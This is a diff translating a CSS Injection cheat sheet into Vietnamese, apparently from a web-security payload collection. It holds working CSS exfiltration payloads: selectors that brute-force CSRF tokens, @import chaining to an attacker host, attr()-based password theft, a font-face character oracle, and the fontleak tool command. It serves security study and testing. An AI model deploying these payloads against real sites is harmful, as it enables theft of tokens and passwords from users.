@@ -1,43 +1,43 @@
 # CSS Injection
 
-> CSS Injection is a vulnerability that occurs when an application allows untrusted CSS to be injected into a web page. This can be exploited to exfiltrate sensitive data, such as CSRF tokens or other secrets, by manipulating the page layout or triggering network requests based on element attributes.
+> CSS Injection là một lỗ hổng xảy ra khi một ứng dụng cho phép CSS không đáng tin cậy được chèn vào một trang web. Điều này có thể bị khai thác để đánh cắp dữ liệu nhạy cảm, chẳng hạn như CSRF token hoặc các bí mật khác, bằng cách thao túng bố cục trang hoặc kích hoạt các request mạng dựa trên thuộc tính của phần tử.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
     * [CSS Selectors](#css-selectors)
     * [CSS Import at-rule](#css-import-at-rule)
     * [CSS Conditionals](#css-conditionals)
     * [CSS Font-face at-rule](#css-font-face-at-rule)
-    * [Attribute Extraction via attr()](#attribute-extraction-via-attr)
+    * [Trích xuất thuộc tính qua attr()](#attribute-extraction-via-attr)
     * [Ligatures](#ligatures)
 * [Labs](#labs)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-* [hackvertor/blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration) - A tool to exfiltrate unknown web pages using Blind CSS.
-* [PortSwigger/css-exfiltration](https://github.com/PortSwigger/css-exfiltration) - Collection of CSS based exfiltration techniques.
-* [cgvwzq/css-scrollbar-attack](https://github.com/cgvwzq/css-scrollbar-attack) - PoC for leaking text nodes via CSS injection using scrollbars.
-* [d0nutptr/sic](https://github.com/d0nutptr/sic) - Sequential Import Chaining for advanced CSS exfiltration.
-* [adrgs/fontleak](https://github.com/adrgs/fontleak) - Tool for fast exfiltration of text using only CSS and Ligatures.
+* [hackvertor/blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration) - Công cụ để đánh cắp dữ liệu từ các trang web chưa biết bằng Blind CSS.
+* [PortSwigger/css-exfiltration](https://github.com/PortSwigger/css-exfiltration) - Tập hợp các kỹ thuật exfiltration dựa trên CSS.
+* [cgvwzq/css-scrollbar-attack](https://github.com/cgvwzq/css-scrollbar-attack) - PoC để rò rỉ các text node thông qua CSS injection bằng thanh cuộn.
+* [d0nutptr/sic](https://github.com/d0nutptr/sic) - Sequential Import Chaining cho kỹ thuật exfiltration CSS nâng cao.
+* [adrgs/fontleak](https://github.com/adrgs/fontleak) - Công cụ để đánh cắp văn bản nhanh chỉ dùng CSS và Ligatures.
 
-## Methodology
+## Phương pháp
 
 ### CSS Selectors
 
-CSS selectors can be used to exfiltrate data. This technique is particularly useful because CSS is often allowed in CSP rules, whereas JavaScript is frequently blocked.
+Các CSS selector có thể được dùng để đánh cắp dữ liệu. Kỹ thuật này đặc biệt hữu ích vì CSS thường được cho phép trong các quy tắc CSP, trong khi JavaScript lại thường bị chặn.
 
-The attack works by brute-forcing a token character by character. Once the first character is identified, the payload is updated to guess the second character, and so on. This often requires an iframe to reload the page with the new payload.
+Cuộc tấn công hoạt động bằng cách brute-force một token từng ký tự một. Sau khi ký tự đầu tiên được xác định, payload được cập nhật để đoán ký tự thứ hai, và cứ tiếp tục như vậy. Điều này thường đòi hỏi một iframe để tải lại trang với payload mới.
 
-* `input[value^=a]` (prefix attribute selector): Selects elements where the value starts with "a".
-* `input[value$=a]` (suffix attribute selector): Selects elements where the value ends with "a".
-* `input[value*=a]` (substring attribute selector): Selects elements where the value contains "a".
+* `input[value^=a]` (prefix attribute selector): Chọn các phần tử có giá trị bắt đầu bằng "a".
+* `input[value$=a]` (suffix attribute selector): Chọn các phần tử có giá trị kết thúc bằng "a".
+* `input[value*=a]` (substring attribute selector): Chọn các phần tử có giá trị chứa "a".
 
-#### Exfiltration via Background Image
+#### Đánh cắp dữ liệu qua Background Image
 
-When a selector matches, the browser attempts to load the background image from a URL controlled by the attacker, thereby leaking the character.
+Khi một selector khớp, trình duyệt sẽ cố gắng tải ảnh nền từ một URL do kẻ tấn công kiểm soát, từ đó làm rò rỉ ký tự đó.
 
 ```css
 input[value^="TOKEN_012"] {
@@ -51,9 +51,9 @@ input[name="pin"][value="1234"] {
 }
 ```
 
-**Tips:**
+**Mẹo:**
 
-* **Hidden Inputs**: You cannot apply a background image directly to a hidden input field. Instead, use a sibling selector (`+` or `~`) to style a visible element that appears after the hidden input.
+* **Input ẩn (Hidden Inputs)**: Bạn không thể áp dụng ảnh nền trực tiếp lên một trường input ẩn. Thay vào đó, hãy dùng sibling selector (`+` hoặc `~`) để tạo style cho một phần tử hiển thị xuất hiện sau input ẩn đó.
 
 ```css
 input[name="csrf-token"][value^="a"] + input {
@@ -61,7 +61,7 @@ input[name="csrf-token"][value^="a"] + input {
 }
 ```
 
-* **Has Selector**: The `:has()` pseudo-class allows styling a parent element based on its children.
+* **Has Selector**: Pseudo-class `:has()` cho phép tạo style cho một phần tử cha dựa trên các phần tử con của nó.
 
 ```css
 div:has(input[value="1337"]) {
@@ -69,35 +69,35 @@ div:has(input[value="1337"]) {
 }
 ```
 
-* **Concurrency**: Use both prefix and suffix selectors to speed up the guessing process. You can assign the prefix check to one property (e.g., `background`) and the suffix check to another (e.g., `list-style-image` or `border-image`).
+* **Tính đồng thời (Concurrency)**: Sử dụng cả prefix và suffix selector để tăng tốc quá trình đoán. Bạn có thể gán việc kiểm tra prefix cho một thuộc tính (ví dụ: `background`) và kiểm tra suffix cho một thuộc tính khác (ví dụ: `list-style-image` hoặc `border-image`).
 
 ### CSS Import at-rule
 
-This technique is known as **Blind CSS Exfiltration**. It relies on importing external stylesheets to trigger callbacks.
+Kỹ thuật này được gọi là **Blind CSS Exfiltration**. Nó dựa vào việc import các stylesheet bên ngoài để kích hoạt các callback.
 
 ```html
 <style>@import url(http://[ATTACKER.DOMAIN.TLD]/staging?len=32);</style>
 <style>@import'//[ATTACKER.DOMAIN.TLD]'</style>
 ```
 
-Frames do not always need to be reloaded to reevaluate CSS. The `@import` rule allows for latency; the browser will process the import and apply the new styles.
+Các frame không phải lúc nào cũng cần được tải lại để đánh giá lại CSS. Quy tắc `@import` cho phép có độ trễ; trình duyệt sẽ xử lý việc import và áp dụng các style mới.
 
 #### Sequential Import Chaining (SIC)
 
-SIC allows an attacker to chain multiple extraction steps without reloading the page:
+SIC cho phép kẻ tấn công xâu chuỗi nhiều bước trích xuất mà không cần tải lại trang:
 
-1. Inject an initial `@import` rule pointing to a staging payload.
-2. The staging payload holds the connection open (long-polling) while generating the next specific payload.
-3. When a CSS rule matches (e.g., a character is found via `background-image`), the browser makes a request.
-4. The server detects this request and generates the next `@import` rule to continue the chain.
+1. Chèn một quy tắc `@import` ban đầu trỏ đến một payload trung gian (staging).
+2. Payload trung gian giữ kết nối mở (long-polling) trong khi tạo ra payload cụ thể tiếp theo.
+3. Khi một quy tắc CSS khớp (ví dụ: một ký tự được tìm thấy qua `background-image`), trình duyệt sẽ thực hiện một request.
+4. Máy chủ phát hiện request này và tạo ra quy tắc `@import` tiếp theo để tiếp tục chuỗi.
 
 ### CSS Conditionals
 
 #### Inline Style Exfiltration
 
-This advanced technique leverages CSS conditionals (like `if()`) and variables to perform logic directly within a style attribute.
+Kỹ thuật nâng cao này tận dụng các CSS conditional (như `if()`) và biến để thực hiện logic trực tiếp bên trong một thuộc tính style.
 
-Example: Stealing a `data-uid` attribute if it matches a value between 1 and 10.
+Ví dụ: Đánh cắp một thuộc tính `data-uid` nếu nó khớp với một giá trị từ 1 đến 10.
 
 ```html
 <div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
@@ -105,11 +105,11 @@ Example: Stealing a `data-uid` attribute if it matches a value between 1 and 10.
 
 ### CSS Font-face at-rule
 
-> The @font-face CSS at-rule specifies a custom font with which to display text; the font can be loaded from either a remote server or a locally-installed font on the user's own computer. - Mozilla
+> @font-face là một at-rule của CSS dùng để chỉ định một font tùy chỉnh để hiển thị văn bản; font này có thể được tải từ một máy chủ từ xa hoặc từ một font được cài đặt cục bộ trên máy tính của người dùng. - Mozilla
 
-The `unicode-range` property allows specific fonts to be used for specific characters. We can abuse this to detect if a specific character is present on the page.
+Thuộc tính `unicode-range` cho phép sử dụng các font cụ thể cho các ký tự cụ thể. Chúng ta có thể lợi dụng điều này để phát hiện xem một ký tự cụ thể có xuất hiện trên trang hay không.
 
-If the character "A" is present, the browser attempts to load the font from `/?A`. If "C" is not present, that request is never made.
+Nếu ký tự "A" có mặt, trình duyệt sẽ cố gắng tải font từ `/?A`. Nếu "C" không có mặt, request đó sẽ không bao giờ được thực hiện.
 
 ```html
 <style>
@@ -121,18 +121,18 @@ If the character "A" is present, the browser attempts to load the font from `/?A
 <p id="sensitive-information">AB</p>
 ```
 
-**Limitations:**
+**Hạn chế:**
 
-* It cannot distinguish repeated characters (e.g., "AA" triggers the request once).
-* It does not determine the order of characters.
-* Despite these limitations, it is a very reliable oracle for checking character existence.
-* Chrome checked this as "WontFix": [issues/40083029](https://issues.chromium.org/issues/40083029)
+* Nó không thể phân biệt các ký tự lặp lại (ví dụ: "AA" chỉ kích hoạt request một lần).
+* Nó không xác định được thứ tự của các ký tự.
+* Mặc dù có những hạn chế này, đây vẫn là một oracle rất đáng tin cậy để kiểm tra sự tồn tại của ký tự.
+* Chrome đã đánh dấu vấn đề này là "WontFix": [issues/40083029](https://issues.chromium.org/issues/40083029)
 
-### Attribute Extraction via attr()
+### Trích xuất thuộc tính qua attr()
 
-The CSS `attr()` function allows CSS to retrieve the value of an attribute of the selected element.  With recent updates (see [Advanced attr()](https://developer.chrome.com/blog/advanced-attr)), this function can be used to extract input's value.
+Hàm `attr()` của CSS cho phép CSS lấy giá trị của một thuộc tính từ phần tử được chọn. Với các bản cập nhật gần đây (xem [Advanced attr()](https://developer.chrome.com/blog/advanced-attr)), hàm này có thể được dùng để trích xuất giá trị của input.
 
-Target HTML:
+HTML mục tiêu:
 
 ```html
 <html>
@@ -145,7 +145,7 @@ Target HTML:
 </html>
 ```
 
-`index.css` (hosted by attacker):
+`index.css` (được lưu trữ bởi kẻ tấn công):
 
 ```css
 input[name="password"] {
@@ -153,9 +153,9 @@ input[name="password"] {
 }
 ```
 
-When `image-set()` is used with `attr()`, the browser may attempt to interpret the attribute value as a URL. If the stylesheet is cross-domain, the relative URL is resolved against the stylesheet's origin, not the page's origin.
+Khi `image-set()` được sử dụng cùng với `attr()`, trình duyệt có thể cố gắng diễn giải giá trị thuộc tính như một URL. Nếu stylesheet thuộc miền khác (cross-domain), URL tương đối sẽ được phân giải dựa trên nguồn gốc (origin) của stylesheet, chứ không phải của trang.
 
-Resulting request on attacker's server:
+Request kết quả trên máy chủ của kẻ tấn công:
 
 ```ps1
 10.10.10.10 - - [15/Feb/2026 16:33:21] "GET /supersecret HTTP/1.1" 404 -
@@ -163,17 +163,17 @@ Resulting request on attacker's server:
 
 ### Ligatures
 
-This technique exploits custom fonts and ligatures. A ligature combines multiple characters into a single glyph. By creating a custom font where specific character sequences (e.g., specific text content) produce a ligature with a huge width, we can detect the change in layout.
+Kỹ thuật này khai thác các font tùy chỉnh và ligature. Một ligature kết hợp nhiều ký tự thành một glyph duy nhất. Bằng cách tạo ra một font tùy chỉnh trong đó các chuỗi ký tự cụ thể (ví dụ: nội dung văn bản cụ thể) tạo ra một ligature có độ rộng rất lớn, chúng ta có thể phát hiện sự thay đổi trong bố cục.
 
-1. Create a custom font with ligatures for target strings.
-2. Use media queries or scrollbars to detect if the rendered width of the element has changed.
+1. Tạo một font tùy chỉnh với các ligature cho các chuỗi mục tiêu.
+2. Sử dụng media query hoặc thanh cuộn để phát hiện xem độ rộng hiển thị của phần tử có thay đổi hay không.
 
 ```ps1
 docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest
 ```
 
-Payload example using `fontleak` with a custom selector, parent element, and alphabet.
-**Warning**: The CSS selector must match exactly one element in the target page.
+Ví dụ payload sử dụng `fontleak` với một selector, phần tử cha, và bảng chữ cái tùy chỉnh.
+**Cảnh báo**: CSS selector phải khớp chính xác với một phần tử duy nhất trên trang mục tiêu.
 
 ```html
 <style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
@@ -183,17 +183,17 @@ Payload example using `fontleak` with a custom selector, parent element, and alp
 
 * [Dojo #25 RootCSS - YesWeHack](https://dojo-yeswehack.com/challenge-of-the-month/dojo-25)
 
-## References
+## Tài liệu tham khảo
 
-* [0CTF 2023 Writeups - Web - newdiary - aszx87410 - December 11, 2023](https://web.archive.org/web/20260208112931/https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)
-* [Bench Press: Leaking Text Nodes with CSS - pspaul - October 20, 2024](https://web.archive.org/web/20250809122224/https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/)
-* [Better Exfiltration via HTML Injection - d0nut - April 11, 2019](https://web.archive.org/web/20260206153955/https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
-* [Blind CSS Exfiltration: exfiltrate unknown web pages - Gareth Heyes - December 5, 2023](https://web.archive.org/web/20231205201432/https://portswigger.net/research/blind-css-exfiltration)
-* [CSS based Attack: Abusing unicode-range of @font-face - Masato Kinugawa - October 23, 2015](https://web.archive.org/web/20260212042745/https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
-* [CSS Data Exfiltration to Steal OAuth Token - - September 13, 2025](https://web.archive.org/web/20250601232405/https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
-* [CSS Injection - xsleaks.dev - May 9, 2025](https://web.archive.org/web/20260114161847/https://xsleaks.dev/docs/attacks/css-injection/)
-* [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - September 28, 2025](https://web.archive.org/web/20250928084357/https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
-* [CSS Injection: Attacking with Just CSS (Part 2) - aszx87410 - September 24, 2023](https://web.archive.org/web/20231223213409/https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)
-* [Fontleak: exfiltrating text using CSS and Ligatures - Dragos Albastroiu - April 16, 2025](https://web.archive.org/web/20251130021102/https://adragos.ro/fontleak/)
-* [How you can steal private data through CSS injection - invicti - April 23, 2018](https://web.archive.org/web/20251107094938/https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)
-* [Inline Style Exfiltration: leaking data with chained CSS conditionals - Gareth Heyes - August 26, 2025](https://web.archive.org/web/20260226022330/https://portswigger.net/research/inline-style-exfiltration)
+* [0CTF 2023 Writeups - Web - newdiary - aszx87410 - 11 tháng 12, 2023](https://web.archive.org/web/20260208112931/https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/)
+* [Bench Press: Leaking Text Nodes with CSS - pspaul - 20 tháng 10, 2024](https://web.archive.org/web/20250809122224/https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/)
+* [Better Exfiltration via HTML Injection - d0nut - 11 tháng 4, 2019](https://web.archive.org/web/20260206153955/https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
+* [Blind CSS Exfiltration: exfiltrate unknown web pages - Gareth Heyes - 5 tháng 12, 2023](https://web.archive.org/web/20231205201432/https://portswigger.net/research/blind-css-exfiltration)
+* [CSS based Attack: Abusing unicode-range of @font-face - Masato Kinugawa - 23 tháng 10, 2015](https://web.archive.org/web/20260212042745/https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
+* [CSS Data Exfiltration to Steal OAuth Token - - 13 tháng 9, 2025](https://web.archive.org/web/20250601232405/https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)
+* [CSS Injection - xsleaks.dev - 9 tháng 5, 2025](https://web.archive.org/web/20260114161847/https://xsleaks.dev/docs/attacks/css-injection/)
+* [CSS Injection Attacks or how to leak content with <style> - Pepe Vila - 28 tháng 9, 2025](https://web.archive.org/web/20250928084357/https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
+* [CSS Injection: Attacking with Just CSS (Part 2) - aszx87410 - 24 tháng 9, 2023](https://web.archive.org/web/20231223213409/https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)
+* [Fontleak: exfiltrating text using CSS and Ligatures - Dragos Albastroiu - 16 tháng 4, 2025](https://web.archive.org/web/20251130021102/https://adragos.ro/fontleak/)
+* [How you can steal private data through CSS injection - invicti - 23 tháng 4, 2018](https://web.archive.org/web/20251107094938/https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)
+* [Inline Style Exfiltration: leaking data with chained CSS conditionals - Gareth Heyes - 26 tháng 8, 2025](https://web.archive.org/web/20260226022330/https://portswigger.net/research/inline-style-exfiltration)
